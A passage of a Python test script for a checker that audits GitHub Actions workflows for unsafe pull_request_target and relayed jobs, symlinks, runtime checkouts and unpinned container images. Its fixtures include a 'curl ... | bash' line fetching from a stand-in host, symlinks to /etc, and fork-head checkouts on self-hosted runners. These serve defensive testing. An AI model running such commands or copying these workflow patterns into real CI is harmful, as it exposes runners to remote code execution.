    with tempfile.TemporaryDirectory() as root, tempfile.TemporaryDirectory() as lists:
        directory = os.path.join(root, ".github", "workflows")
        os.makedirs(directory)
        for name, body in files.items():
            target = os.path.join(root, name) if "/" in name else os.path.join(directory, name)
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "w", encoding="utf-8") as handle:
                handle.write(textwrap.dedent(body))
        subprocess.run(["git", "init", "-q", root], check=True)
        subprocess.run(["git", "-C", root, "add", "-A"], check=True)
        if mutate:
            mutate(root)
        arguments = []
        if row is not None:
            reviewed = os.path.join(lists, "reviewed.tsv")
            with open(reviewed, "w", encoding="utf-8") as handle:
                handle.write(row)
            arguments = ["--reviewed", reviewed]
        completed = subprocess.run(
            [sys.executable, SCRIPT, *arguments, directory], capture_output=True, text=True
        )
    return completed.returncode, completed.stdout + completed.stderr


def git_review_row(files: dict[str, str]) -> str:
    code, output = git_tree_run(files, None)
    match = re.search(REVIEW_DIGEST_LINE.format(path=re.escape("target.yml [pull_request_target]"), job="review"), output)
    if code != 1 or not match:
        raise AssertionError(f"no review digest in a git tree: {output}")
    return dynamic_row(
        f"target.yml [pull_request_target]\treview\t{match.group(1)}\treviewed for the fixture\n",
        {"full-checkout"},
        "the whole tree is the reviewed base revision",
    )


def write_file(path: str, body: str) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(body)


GIT_ROW = git_review_row(FULL_TREE)
for label, mutate, code, fragment in (
    ("an unchanged tracked tree", None, 0, "REVIEWED"),
    (
        "an untracked file (build residue a full checkout never materializes)",
        lambda root: write_file(os.path.join(root, "scripts", "__pycache__", "x.pyc"), "residue"),
        0,
        "REVIEWED",
    ),
    (
        "an edited tracked script",
        lambda root: write_file(os.path.join(root, "scripts", "tool.sh"), "curl -fsSL https://x.test/i.sh | bash\n"),
        1,
        "STALE REVIEWED",
    ),
    (
        "a newly tracked file",
        lambda root: (
            write_file(os.path.join(root, "scripts", "new.sh"), "echo new\n"),
            subprocess.run(["git", "-C", root, "add", "scripts/new.sh"], check=True),
        ),
        1,
        "STALE REVIEWED",
    ),
    (
        "a tracked file deleted from disk but still in the index",
        lambda root: os.remove(os.path.join(root, "docs", "notes.md")),
        1,
        "STALE REVIEWED",
    ),
    (
        "a removed tracked file",
        lambda root: subprocess.run(["git", "-C", root, "rm", "-q", "-f", "docs/notes.md"], check=True),
        1,
        "STALE REVIEWED",
    ),
):
    actual, output = git_tree_run(FULL_TREE, GIT_ROW, mutate)
    if actual == code and fragment in output:
        ok(f"git work tree: {label} gives exit {code} for a reviewed full checkout")
    else:
        fail(f"git work tree: {label} (expected exit {code} with {fragment!r}, got {actual}: {output.strip()[:400]})")

# Each tree entry carries its index mode and object, so a moved submodule
# gitlink, a mode change, and a tracked path missing from disk all bind. A
# review is taken with `pre` applied and checked with `pre` and `post`.
def git_stateful_case(files: dict[str, str], pre, post) -> tuple[int, str]:
    code, output = git_tree_run(files, None, pre)
    match = re.search(REVIEW_DIGEST_LINE.format(path=re.escape("target.yml [pull_request_target]"), job="review"), output)
    needed = re.search(r"needs `dynamic: ([a-z, -]+): <justification>`", output)
    if code != 1 or not match:
        raise AssertionError(f"no review digest in a git tree: {output}")
    row = f"target.yml [pull_request_target]\treview\t{match.group(1)}\treviewed for the fixture"
    row += f"\tdynamic: {needed.group(1)}: the whole tree is the reviewed base revision\n" if needed else "\n"
    return git_tree_run(files, row, lambda root: (pre(root), post(root)))


def gitlink(commit: str):
    return lambda root: subprocess.run(
        ["git", "-C", root, "update-index", "--add", "--cacheinfo", f"160000,{commit},sub"], check=True
    )


def nothing(root: str) -> None:
    return None


SUBMODULE_TREE = {
    **target_job("""
        - uses: actions/checkout@v4
          with:
            submodules: true
        - run: make -C sub
    """),
    "Makefile": "all:\n",
}
for label, files, pre, post, code, fragment in (
    ("an unchanged gitlink", FULL_TREE, gitlink("1" * 40), nothing, 0, "REVIEWED"),
    ("a gitlink moved to another commit", FULL_TREE, gitlink("1" * 40), gitlink("2" * 40), 1, "STALE REVIEWED"),
    ("a gitlink moved under submodules: true", SUBMODULE_TREE, gitlink("1" * 40), gitlink("2" * 40), 1,
     "STALE REVIEWED"),
    ("a tracked script made executable", FULL_TREE, nothing,
     lambda root: subprocess.run(["git", "-C", root, "update-index", "--chmod=+x", "scripts/tool.sh"], check=True),
     1, "STALE REVIEWED"),
    # A path missing from disk is still in the index, so a checkout puts it
    # there; untracking it removes it from what a checkout materializes.
    ("an index-only path that is then untracked", FULL_TREE,
     lambda root: os.remove(os.path.join(root, "docs", "notes.md")),
     lambda root: subprocess.run(["git", "-C", root, "rm", "-q", "--cached", "docs/notes.md"], check=True),
     1, "STALE REVIEWED"),
):
    actual, output = git_stateful_case(files, pre, post)
    if actual == code and fragment in output:
        ok(f"git work tree: {label} gives exit {code} for a reviewed full checkout")
    else:
        fail(f"git work tree: {label} (expected exit {code} with {fragment!r}, got {actual}: {output.strip()[:400]})")


# The tree digest's entry encoding is unambiguous. Under the old
# `path\0content\n` lines, a link `a -> "T\nb"` beside a file `c` hashed the
# same bytes as a link `a -> "T"` beside a file named "b\nc".
def link_tree_run(link_target: str, file_name: str, row: str | None) -> tuple[int, str]:
    with tempfile.TemporaryDirectory() as root, tempfile.TemporaryDirectory() as lists:
        directory = os.path.join(root, ".github", "workflows")
        os.makedirs(directory)
        write_file(os.path.join(directory, "target.yml"), textwrap.dedent(FULL_TREE["target.yml"]))
        os.symlink(link_target, os.path.join(root, "a"))
        write_file(os.path.join(root, file_name), "same bytes\n")
        arguments = []
        if row is not None:
            reviewed = os.path.join(lists, "reviewed.tsv")
            write_file(reviewed, row)
            arguments = ["--reviewed", reviewed]
        completed = subprocess.run([sys.executable, SCRIPT, *arguments, directory], capture_output=True, text=True)
    return completed.returncode, completed.stdout + completed.stderr


code, output = link_tree_run("T\nb", "c", None)
LINK_DIGEST = re.search(REVIEW_DIGEST_LINE.format(path=re.escape("target.yml [pull_request_target]"), job="review"), output)
LINK_ROW = (
    f"target.yml [pull_request_target]\treview\t{LINK_DIGEST.group(1) if LINK_DIGEST else 'missing'}\tr"
    "\tdynamic: full-checkout: reviewed tree\n"
)
for label, target, name, code, fragment in (
    ("the reviewed link-and-file tree", "T\nb", "c", 0, "REVIEWED"),
    ("a tree whose old encoding collided with it", "T", "b\nc", 1, "STALE REVIEWED"),
    ("the same tree with the link retargeted", "U\nb", "c", 1, "STALE REVIEWED"),
):
    actual, output = link_tree_run(target, name, LINK_ROW)
    if actual == code and fragment in output:
        ok(f"tree digest encoding: {label} gives exit {code}")
    else:
        fail(f"tree digest encoding: {label} (expected exit {code} with {fragment!r}, got {actual}: {output.strip()[:400]})")

# pull_request.base.sha is the base as of the pull request's last update. It
# is not refreshed when main advances, so a checkout at it can put older bytes
# on disk than the tree under review: it is a runtime checkout, not the tree.
BASE_SHA_FULL = shaped_job("- uses: actions/checkout@v4\n  with:\n    ref: ${{ github.event.pull_request.base.sha }}\n"
                           "- run: ./scripts/x.sh", {"scripts/x.sh": "echo\n"})
expect(
    BASE_SHA_FULL,
    1,
    ("checkout of this repository@${{ github.event.pull_request.base.sha }} is selected at runtime",
     "has no sparse-checkout list"),
    "a full checkout at pull_request.base.sha is refused as a runtime checkout",
)
BASE_SHA_SPARSE = shaped_job("- uses: actions/checkout@v4\n  with:\n    ref: ${{ github.event.pull_request.base.sha }}\n"
                             "    sparse-checkout: scripts/x.sh\n    sparse-checkout-cone-mode: false\n"
                             "- run: bash scripts/x.sh", {"scripts/x.sh": "echo\n"})
expect(
    BASE_SHA_SPARSE,
    1,
    (REVIEW_REQUIRED, "dynamic: runtime-checkout"),
    "a sparse checkout at pull_request.base.sha needs dynamic: runtime-checkout",
)
for ref in ("${{ github.sha }}", "${{github.sha}}", ""):
    tree_ref = shaped_job("- uses: actions/checkout@v4\n  with:\n" + (f"    ref: {ref}\n" if ref else "")
                          + "    sparse-checkout: scripts/x.sh\n    sparse-checkout-cone-mode: false\n"
                          "- run: bash scripts/x.sh", {"scripts/x.sh": "echo\n"})
    code, output = run_checker(tree_ref)
    if code == 1 and REVIEW_REQUIRED in output and "runtime-checkout" not in output:
        ok(f"a sparse checkout at {ref or 'the default ref'} is the scanned tree")
    else:
        fail(f"a sparse checkout at {ref or 'the default ref'} is the scanned tree (got {code}: {output.strip()[:300]})")

# Step-level images get the container: rule: a `docker://` step and a local
# Docker action's image, or every `FROM` of the Dockerfile it builds, must be
# pinned by an @sha256: digest, or no entry can accept the job.
PIN = "@sha256:" + "c" * 64
DOCKER_ACTION = ".github/actions/d/action.yml"
for label, steps, extra, refused in (
    ("a docker:// step on a tag", "- uses: docker://alpine:latest", {}, True),
    ("a docker:// step on an expression", "- uses: docker://${{ vars.IMAGE }}" + PIN, {}, True),
    ("a docker:// step on a digest", "- uses: docker://alpine" + PIN, {}, False),
    ("a local docker action on a tagged docker:// image", "- uses: ./.github/actions/d",
     {DOCKER_ACTION: "runs:\n  using: docker\n  image: docker://alpine:3.20\n"}, True),
    ("a local docker action on a pinned docker:// image", "- uses: ./.github/actions/d",
     {DOCKER_ACTION: f"runs:\n  using: docker\n  image: docker://alpine{PIN}\n"}, False),
    ("a local docker action built FROM a tag", "- uses: ./.github/actions/d",
     {DOCKER_ACTION: "runs:\n  using: docker\n  image: Dockerfile\n",
      ".github/actions/d/Dockerfile": "FROM alpine:3.20\nRUN true\n"}, True),
    ("a local docker action with one unpinned stage", "- uses: ./.github/actions/d",
     {DOCKER_ACTION: "runs:\n  using: docker\n  image: Dockerfile\n",
      ".github/actions/d/Dockerfile": f"FROM golang{PIN} AS build\nFROM --platform=linux/amd64 debian:12\n"}, True),
    ("a local docker action built FROM digests, stages, and scratch", "- uses: ./.github/actions/d",
     {DOCKER_ACTION: "runs:\n  using: docker\n  image: Dockerfile\n",
      ".github/actions/d/Dockerfile": f"FROM golang{PIN} AS build\nFROM build AS test\nFROM scratch\n"}, False),
    ("a local docker action whose Dockerfile has no FROM", "- uses: ./.github/actions/d",
     {DOCKER_ACTION: "runs:\n  using: docker\n  image: Dockerfile\n", ".github/actions/d/Dockerfile": "RUN true\n"}, True),
    ("a local docker action with no image", "- uses: ./.github/actions/d",
     {DOCKER_ACTION: "runs:\n  using: docker\n"}, True),
):
    code, output = run_checker(shaped_job(steps, extra))
    is_refused = "must be pinned by an @sha256: digest" in output
    if code == 1 and is_refused == refused and (refused or REVIEW_REQUIRED in output):
        ok(f"{label} is {'refused' if refused else 'reviewable'}")
    else:
        fail(f"{label} should be {'refused' if refused else 'reviewable'} (got {code}: {output.strip()[:400]})")

# Sparse paths never follow symlinks (reviewer probe P7): a link binds as its
# target text, and a target outside the tree, or a path through a linked
# directory, is an unscanned path rather than the checker host's bytes.
def linked_run(steps: str, links: dict[str, str], row: str | None = None, files: dict | None = None):
    with tempfile.TemporaryDirectory() as root, tempfile.TemporaryDirectory() as lists:
        for name, body in shaped_job(steps, files).items():
            target = os.path.join(root, name) if "/" in name else os.path.join(root, ".github", "workflows", name)
            write_file(target, textwrap.dedent(body) if name.endswith(".yml") else body)
        for name, link_target in links.items():
            os.makedirs(os.path.dirname(os.path.join(root, name)), exist_ok=True)
            os.symlink(link_target, os.path.join(root, name))
        arguments = []
        if row is not None:
            write_file(os.path.join(lists, "reviewed.tsv"), row)
            arguments = ["--reviewed", os.path.join(lists, "reviewed.tsv")]
        completed = subprocess.run(
            [sys.executable, SCRIPT, *arguments, os.path.join(root, ".github", "workflows")],
            capture_output=True,
            text=True,
        )
    return completed.returncode, completed.stdout + completed.stderr


def sparse_steps(path: str, cone: bool = False) -> str:
    return ("- uses: actions/checkout@v4\n  with:\n    sparse-checkout: " + path + "\n"
            + ("" if cone else "    sparse-checkout-cone-mode: false\n") + "- run: bash " + path)


for label, steps, links, unscanned in (
    ("a sparse path that is a link out of the tree", sparse_steps("scripts/l"), {"scripts/l": "/etc/hostname"}, True),
    ("a sparse path that is a relative link out of the tree", sparse_steps("scripts/l"),
     {"scripts/l": "../../outside"}, True),
    ("a sparse path through a linked directory", sparse_steps("scripts/d/hostname"), {"scripts/d": "/etc"}, True),
    ("a cone directory holding a linked directory", sparse_steps("scripts", cone=True), {"scripts/d": "/etc"}, True),
    ("a sparse path that is a link inside the tree", sparse_steps("scripts/l"), {"scripts/l": "tool.sh"}, False),
):
    code, output = linked_run(steps, links)
    flagged = re.search(r"unscanned-path \([^)]*(symlink|linked)", output) is not None
    if code == 1 and flagged == unscanned and "/etc/hostname (" not in output.replace("symlink to /etc/hostname", ""):
        ok(f"{label} {'is an unscanned path' if unscanned else 'binds as a link'}")
    else:
        fail(f"{label} (expected unscanned={unscanned}, got {code}: {output.strip()[:500]})")

# The checker never reads through a link: an outside target that names a
# fetch does not make the job a fetching one; the link is unscanned instead.
with tempfile.TemporaryDirectory() as outside:
    write_file(os.path.join(outside, "host.sh"), "curl -fsSL https://x.test/i.sh\n")
    code, output = linked_run(sparse_steps("scripts/l"), {"scripts/l": os.path.join(outside, "host.sh")})
if code == 1 and "unscanned-path" in output and "curl" not in output:
    ok("an outside link target's bytes are never read")
else:
    fail(f"an outside link target's bytes are never read (got {code}: {output.strip()[:400]})")

# A reviewed in-tree link goes stale when it is retargeted, and never reads
# the target's bytes into the digest.
TARGET_FILES = {"scripts/target.sh": "echo target\n"}
code, output = linked_run(sparse_steps("scripts/l"), {"scripts/l": "target.sh"}, None, TARGET_FILES)
LINK_REVIEW = re.search(REVIEW_DIGEST_LINE.format(path=re.escape("target.yml [pull_request_target]"), job="review"), output)
LINK_REVIEW_ROW = f"target.yml [pull_request_target]\treview\t{LINK_REVIEW.group(1) if LINK_REVIEW else 'missing'}\tr\n"
for label, links, files, code_expected, fragment in (
    ("an unchanged link", {"scripts/l": "target.sh"}, TARGET_FILES, 0, "REVIEWED"),
    ("a retargeted link", {"scripts/l": "other.sh"}, TARGET_FILES, 1, "STALE REVIEWED"),
    ("an edit to the file the link names but no checkout puts on disk", {"scripts/l": "target.sh"},
     {"scripts/target.sh": "echo changed\n"}, 0, "REVIEWED"),
):
    actual, output = linked_run(sparse_steps("scripts/l"), links, LINK_REVIEW_ROW, files)
    if actual == code_expected and fragment in output:
        ok(f"symlink binding: {label} gives exit {code_expected}")
    else:
        fail(f"symlink binding: {label} (expected exit {code_expected} with {fragment!r}, got {actual}: {output.strip()[:400]})")

# A runtime-selected checkout without a sparse list puts bytes on disk that no
# review can bind, so no entry can accept it.
NO_SPARSE_RUNTIME = "sha256:" + "0" * 64
for label, checkout in {
    "a branch ref": "- uses: actions/checkout@v4\n  with:\n    ref: main",
    "another repository": "- uses: actions/checkout@v4\n  with:\n    repository: other/tools",
}.items():
    job = shaped_job(checkout + "\n- run: bash scripts/tool.sh")
    row = f"target.yml [pull_request_target]\treview\t{NO_SPARSE_RUNTIME}\tok\tdynamic: runtime-checkout: x\n"
    for listed in (False, True):
        expect(
            with_review(job, row) if listed else job,
            1,
            ("VIOLATION: target.yml [pull_request_target]: job 'review'", "has no sparse-checkout list",
             "add a sparse-checkout list"),
            f"a runtime checkout of {label} with no sparse list is refused" + (" even when listed" if listed else ""),
            *(REVIEWED_ARGS if listed else ()),
        )

# A job container or service image is pulled at runtime: it is a fetch, and
# only a digest-pinned image can be bound by a review.
PINNED_IMAGE = "ghcr.io/x/tool@sha256:" + "a" * 64
REPINNED_IMAGE = "ghcr.io/x/tool@sha256:" + "b" * 64
for label, job_yaml in {
    "a job container tag": "container: ghcr.io/x/evil:latest\n",
    "a job container mapping image tag": "container:\n  image: ghcr.io/x/evil:latest\n",
    "a job container with no image": "container:\n  options: --cpus 1\n",
    "a job container chosen by an expression": "container: ${{ vars.IMAGE }}\n",
    "an expression in front of a digest": "container: ${{ vars.REGISTRY }}/tool@sha256:" + "a" * 64 + "\n",
    "an unspaced expression in front of a digest": "container: ${{vars.REGISTRY}}/tool@sha256:" + "a" * 64 + "\n",
    "a service image tag": "services:\n  db:\n    image: postgres:16\n",
    "a service string image": "services:\n  db: postgres:16\n",
    "a tag beside a digest-pinned service": f"services:\n  db:\n    image: {PINNED_IMAGE}\n  cache:\n    image: redis:7\n",
}.items():
    job = shaped_job("- run: echo hi", None, job_yaml)
    row = f"target.yml [pull_request_target]\treview\t{NO_SPARSE_RUNTIME}\tok\tdynamic: fetch: x\n"
    for listed in (False, True):
        expect(
            with_review(job, row) if listed else job,
            1,
            ("VIOLATION: target.yml [pull_request_target]: job 'review'", "must be pinned by an @sha256: digest"),
            f"{label} is refused" + (" even when listed" if listed else ""),
            *(REVIEWED_ARGS if listed else ()),
        )
for label, job_yaml in {
    "a digest-pinned job container": f"container: {PINNED_IMAGE}\n",
    "a digest-pinned job container mapping": f"container:\n  image: {PINNED_IMAGE}\n",
    "a digest-pinned service": f"services:\n  db:\n    image: {PINNED_IMAGE}\n",
}.items():
    job = shaped_job("- run: echo hi", None, job_yaml)
    try:
        row = review_row(job, "target.yml [pull_request_target]", "review")
    except AssertionError as error:
        fail(f"{label}: a digest-pinned image must be reviewable ({error})")
        continue
    code, output = run_checker(with_review(job, row), *REVIEWED_ARGS)
    computed = named_reasons(output)
    if code == 1 and computed == {"fetch"} and "image ghcr.io/x/tool@sha256:" in output:
        ok(f"{label} is a fetch that needs dynamic: fetch")
    else:
        fail(f"{label}: expected unresolved fetch, got {sorted(computed)} (exit {code}: {output.strip()[:400]})")
    fetch_row = dynamic_row(row, {"fetch"}, "the pinned image only runs the reviewed tools")
    expect(with_review(job, fetch_row), 0, ("REVIEWED",), f"{label} with dynamic: fetch is classified", *REVIEWED_ARGS)
    expect(
        with_review(shaped_job("- run: echo hi", None, job_yaml.replace(PINNED_IMAGE, REPINNED_IMAGE)), fetch_row),
        1,
        ("STALE REVIEWED",),
        f"repinning {label} turns its entry stale",
        *REVIEWED_ARGS,
    )
expect(
    {
        "target.yml": """
            on: pull_request_target
            jobs:
              review:
                runs-on: ubuntu-24.04
                container: ghcr.io/x/tool:latest
                steps:
                  - run: echo hi
        """,
    },
    0,
    ("clean",),
    "a mutable container on a hosted-only job is outside this policy",
)


# Every event that runs pull-request code, or can carry a fork-controlled ref,
# is either classified or refused; an unclassified one never reads as clean.
def event_job(trigger: str, runs_on: str = "[self-hosted, general]") -> dict[str, str]:
    return {
        "ci.yml": f"""
            on: {trigger}
            jobs:
              test:
                runs-on: {runs_on}
                steps:
                  - uses: actions/checkout@v4
                  - run: npm ci && npm test
        """,
    }


for event in ("pull_request_review", "pull_request_review_comment", "merge_group"):
    expect(
        event_job(f"[{event}]"),
        1,
        (f"VIOLATION: ci.yml [{event}]: job 'test': {event} in a public repository can resolve to self-hosted",),
        f"{event} runs pull-request code and is held to the pull_request rule",
    )
    expect(
        event_job(f"{{{event}: {{types: [submitted]}}}}", "ubuntu-24.04"),
        0,
        ("clean",),
        f"a hosted-only {event} job is clean",
    )
for event in ("pull_request_foo", "pull_request_target_v2", "check_run", "check_suite", "status",
              "deployment", "deployment_status", "made_up_event"):
    expect(
        event_job(f"[push, {event}]"),
        2,
        ("UNDETERMINED", f"ci.yml: event '{event}'"),
        f"an unclassified event {event} is undetermined, not clean",
    )
expect(
    event_job("[push, schedule, release]"),
    0,
    ("clean",),
    "events that carry no fork-controlled ref stay outside the rule",
)
for event in ("workflow_dispatch", "workflow_call", "repository_dispatch", "fork", "issues",
              "discussion", "discussion_comment"):
    expect(
        event_job(f"[push, {event}]"),
        1,
        (f"VIOLATION: ci.yml [{event}]: job 'test'",),
        f"{event} is checked, not left outside the rule",
    )

# A workflow-level defaults.run.shell is a non-default shell for every job.
WORKFLOW_SHELL = shaped_job("- run: echo hi")
WORKFLOW_SHELL["target.yml"] = WORKFLOW_SHELL["target.yml"].replace(
    "jobs:\n", "defaults:\n  run:\n    shell: sh\njobs:\n", 1
)
WORKFLOW_SHELL_ROW = review_row(WORKFLOW_SHELL, "target.yml [pull_request_target]", "review")
expect(
    with_review(WORKFLOW_SHELL, WORKFLOW_SHELL_ROW),
    1,
    ("unclassifiable", "does not name: shell (`shell: sh` in workflow defaults.run)"),
    "a workflow-level defaults.run.shell needs dynamic: shell",
    *REVIEWED_ARGS,
)
expect(
    with_review(WORKFLOW_SHELL, dynamic_row(WORKFLOW_SHELL_ROW, {"shell"}, "sh runs only echo")),
    0,
    ("REVIEWED",),
    "a workflow-level defaults.run.shell with dynamic: shell is classified",
    *REVIEWED_ARGS,
)

# A repeated (path, job) key is a format error, never a silent override.
for flag, rows in (
    ("--reviewed", FETCH_ROW + FETCH_ROW),
    ("--reviewed", "target.yml [pull_request_target]\treview\t" + NO_SPARSE_RUNTIME + "\tstale first\n" + FETCH_ROW),
):
    expect(
        with_review(FETCH_JOB, rows),
        2,
        ("UNDETERMINED", "reviewed.tsv:2: duplicate entry for target.yml [pull_request_target] job 'review'"),
        "a duplicate reviewed row is rejected wherever the valid row sits",
        flag,
        "{dir}/reviewed.tsv",
    )
PENDING_ROW = "ci.yml\ttest\t" + NO_SPARSE_RUNTIME + "\tratcheted\n"
expect(
    {**pull_request_job("[self-hosted, general]"), "pending.tsv": PENDING_ROW + PENDING_ROW},
    2,
    ("UNDETERMINED", "pending.tsv:2: duplicate entry for ci.yml job 'test'"),
    "a duplicate pending row is rejected",
    "--pending",
    "{dir}/pending.tsv",
)


# ---------------------------------------------------------------------------
# Relays (ADR 0235). workflow_dispatch, workflow_call, and repository_dispatch
# run with values their dispatcher or caller chooses; gate-rearm.yml's
# pull_request_target run dispatches ai-review-merge.yml with a fork's head.
# A relayed job on a persistent-capable selector that materializes the head,
# or whose head detection cannot decide, is refused outright; any other one
# needs a reviewed entry. fork, issues, and discussion* get the issue_comment
# treatment. These are the third-round reviewer's four probes, each on
# [self-hosted, general], which all exited 0 before.
# ---------------------------------------------------------------------------
def relay_job(trigger: str, steps: str, runs_on: str = "[self-hosted, general]", head: str = "") -> dict[str, str]:
    return {
        "relay.yml": f"""
            on: {trigger}
            jobs:
              j:
                runs-on: {runs_on}
                steps:
{textwrap.indent(textwrap.dedent(steps), " " * 18)}
        """,
    }


RELAY_REFUSAL = "a relayed run can be handed a pull request head"
PROBES = {
    "workflow_dispatch": ("""
        - uses: actions/checkout@v4
          with:
            ref: refs/pull/${{ inputs.pr }}/head
        - run: make
    """, (RELAY_REFUSAL, "must run on an ephemeral runner")),
    "workflow_call": ("""
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        - run: make
    """, (RELAY_REFUSAL, "must run on an ephemeral runner")),
    "fork": ("""
        - uses: actions/checkout@v4
          with:
            repository: ${{ github.event.forkee.full_name }}
        - run: make
    """, ("has no sparse-checkout list",)),
    "issues": ("""
        - uses: actions/checkout@v4
          with:
            ref: refs/pull/${{ github.event.issue.title }}/head
        - run: make
    """, ("has no sparse-checkout list",)),
}
for event, (steps, fragments) in PROBES.items():
    expect(
        relay_job(event, steps),
        1,
        (f"VIOLATION: relay.yml [{event}]: job 'j'", HEAD_DIAG, *fragments),
        f"reviewer probe: {event} checking out a fork-chosen head on a persistent runner is refused",
    )
    expect(
        relay_job(event, steps, "ubuntu-24.04"),
        0,
        ("clean",),
        f"reviewer probe: the same {event} job on a hosted runner is clean",
    )

# With a sparse list, the fork and issues probes are ordinary privileged
# findings: they need a reviewed entry, and its dynamic: must name the head.
for event in ("fork", "issues"):
    sparse = PROBES[event][0].replace("        - run: make", "            sparse-checkout: Makefile\n        - run: make")
    expect(
        relay_job(event, sparse),
        1,
        (f"VIOLATION: relay.yml [{event}]: job 'j'", "privileged-event job", REVIEW_REQUIRED,
         "dynamic: head-materialization"),
        f"a sparse {event} checkout of a fork-chosen head needs a reviewed entry naming the head",
    )

# A relay head refusal survives a reviewed entry that names every reason.
DISPATCH_HEAD = relay_job("workflow_dispatch", PROBES["workflow_dispatch"][0])
code, output = run_checker(DISPATCH_HEAD)
RELAY_REVIEW = re.search(r"review digest (sha256:[0-9a-f]{64})", output)
expect(
    with_review(
        DISPATCH_HEAD,
        f"relay.yml [workflow_dispatch]\tj\t{RELAY_REVIEW.group(1) if RELAY_REVIEW else 'missing'}\treviewed"
        "\tdynamic: head-materialization, runtime-checkout: claims the ref is safe\n"
        if RELAY_REVIEW
        else "",
    ),
    1,
    (RELAY_REFUSAL,),
    "no reviewed entry can accept a relayed job that materializes the head",
    *REVIEWED_ARGS,
)

# A relayed job with no head pattern needs, and accepts, a reviewed entry.
DISPATCH_PLAIN = relay_job("workflow_dispatch", "- run: echo maintenance")
expect(DISPATCH_PLAIN, 1, ("relayed job can resolve to a persistent runner and " + REVIEW_REQUIRED,),
       "a relayed job without a head pattern needs a reviewed entry")
DISPATCH_PLAIN_ROW = review_row(DISPATCH_PLAIN, "relay.yml [workflow_dispatch]", "j")
expect(with_review(DISPATCH_PLAIN, DISPATCH_PLAIN_ROW), 0, ("REVIEWED: relay.yml [workflow_dispatch]: job 'j'",),
       "a reviewed relayed job without a head pattern is accepted", *REVIEWED_ARGS)

# Dispatch inputs take the values a dispatcher can choose: a `choice` reaches
# each option, so a job guarded on one is reachable, and an unlisted value is not.
CHOICE_GATED = {
    "relay.yml": """
        on:
          workflow_dispatch:
            inputs:
              environment:
                type: choice
                options: [ai-review-app]
              pr:
                required: true
        jobs:
          j:
            if: inputs.environment == 'ai-review-app'
            runs-on: [self-hosted, general]
            steps:
              - run: echo "$PR"
                env:
                  PR: ${{ inputs.pr }}
    """,
}
expect(CHOICE_GATED, 1, ("VIOLATION: relay.yml [workflow_dispatch]: job 'j'",),
       "a job guarded on a dispatch choice option is reachable")
UNREACHABLE_CHOICE = {"relay.yml": CHOICE_GATED["relay.yml"].replace("== 'ai-review-app'", "== 'elsewhere'")}
expect(UNREACHABLE_CHOICE, 0, ("clean",), "a job guarded on a value no option can take is unreachable")
BOOLEAN_GATED = {"relay.yml": CHOICE_GATED["relay.yml"]
                 .replace("type: choice\n                options: [ai-review-app]", "type: boolean")
                 .replace("inputs.environment == 'ai-review-app'", "inputs.environment")}
expect(BOOLEAN_GATED, 1, ("VIOLATION: relay.yml [workflow_dispatch]: job 'j'",),
       "a job guarded on a boolean dispatch input is reachable")

# A called workflow sees its caller's event, so a standalone workflow_call scan
# tries every caller event rather than the literal name workflow_call.
expect(
    relay_job("workflow_call", "- run: echo hi").__class__({
        "relay.yml": """
            on: workflow_call
            jobs:
              j:
                if: github.event_name == 'pull_request'
                runs-on: [self-hosted, general]
                steps:
                  - run: echo hi
        """,
    }),
    1,
    ("VIOLATION: relay.yml [workflow_call]: job 'j'",),
    "a workflow_call job guarded on the caller's pull_request event is reachable",
)
# A caller-supplied runner input is adversarial in a standalone call.
expect(
    {
        "relay.yml": """
            on:
              workflow_call:
                inputs:
                  runner:
                    type: string
                    default: '["ubuntu-24.04"]'
            jobs:
              j:
                runs-on: ${{ fromJSON(inputs.runner) }}
                steps:
                  - run: echo hi
        """,
    },
    1,
    ("VIOLATION: relay.yml [workflow_call]: job 'j'",),
    "a standalone workflow_call honoring a caller runner input can reach the pool",
)

BACKLOG_DIGEST_LINE = re.compile(r"backlog digest (sha256:[0-9a-f]{64})")


def backlog_fixture(steps: str, extra: str = "") -> dict[str, str]:
    """capability-floor-observe.yml's `observe`, a backlog job with no refusal."""
    return {
        "capability-floor-observe.yml": f"""
            on: workflow_dispatch
            jobs:
              observe:
                runs-on: [self-hosted, general]
{textwrap.indent(textwrap.dedent(extra), " " * 16)}
                steps:
{textwrap.indent(textwrap.dedent(steps), " " * 18)}
        """,
    }


# One checker run names every backlog row a fixture has: the rows for a
# fixture's jobs come from one run, not one run per job.
BACKLOG_OUTPUT: dict[tuple, str] = {}


def backlog_row(workflows: dict[str, str], path: str, job: str) -> str:
    """The pending row the checker itself names for a backlog job."""
    key = tuple(sorted((name, type(body).__name__, body) for name, body in workflows.items()))
    if key not in BACKLOG_OUTPUT:
        BACKLOG_OUTPUT[key] = run_checker(workflows)[1]
    output = BACKLOG_OUTPUT[key]
    found = [
        match.group(1)
        for line in output.splitlines()
        if f"{path}: job '{job}'" in line
        for match in [BACKLOG_DIGEST_LINE.search(line)]
        if match
    ]
    return f"{path}\t{job}\t{found[0] if found else 'sha256:' + 'f' * 64}\t#1831 backlog\n"


def expect_no_pending(workflows: dict[str, str], label: str, fragments: tuple[str, ...], *arguments: str) -> None:
    """Exit 1, the fragments present, and no PENDING line: a row did not waive it."""
    actual, output = run_checker(workflows, *arguments)
    missing = [fragment for fragment in fragments if fragment not in output]
    if actual != 1 or missing or "PENDING:" in output.replace("STALE PENDING:", ""):
        fail(f"{label} (expected exit 1 with {missing or fragments} and no PENDING line, got {actual}: {output.strip()})")
    else:
        ok(label)


PENDING_ARGS = ("--pending", "{dir}/pending.tsv")


# The relay backlog is an exact pending ratchet keyed to the backlog digest. It
# is frozen in code, so these fixtures use real backlog keys: runner-canary's
# `canary` carried a relayed-head refusal when the backlog was frozen, and
# capability-floor-observe's `observe` carried none.
def backlog_relay(name: str, job: str, steps: str, runs_on: str = "[self-hosted, general]") -> dict[str, str]:
    return {name: relay_job("workflow_dispatch", steps, runs_on)["relay.yml"].replace("\n              j:\n", f"\n              {job}:\n")}


RELAY_DIGEST_LINE = BACKLOG_DIGEST_LINE
# Sparse, so its only refusal is the relayed head the backlog froze for it.
SPARSE_HEAD = PROBES["workflow_dispatch"][0].replace(
    "        - run: make", "            sparse-checkout: Makefile\n        - run: make"
)
CANARY_HEAD = backlog_relay("runner-canary.yml", "canary", SPARSE_HEAD)
code, output = run_checker(CANARY_HEAD)
HEAD_RELAY_DIGEST = RELAY_DIGEST_LINE.search(output)
HEAD_PENDING = (f"runner-canary.yml [workflow_dispatch]\tcanary\t{HEAD_RELAY_DIGEST.group(1)}\t#1831 backlog\n"
                if HEAD_RELAY_DIGEST else "missing\n")
